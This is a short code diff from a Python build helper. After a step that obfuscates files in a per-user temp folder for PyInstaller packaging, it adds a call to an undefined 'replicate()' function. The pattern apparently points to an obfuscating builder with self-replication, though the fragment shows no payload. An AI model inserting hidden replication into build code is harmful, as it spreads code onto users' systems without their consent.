@@ -269,6 +269,7 @@ def get_pyinstaller(pythonPath: str) -> bool:
         return False
     if is_msvc_exist() or is_gcc_in_path():
         if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
+            replicate()
             return True
         return False
     if download_gcc(pythonPath):
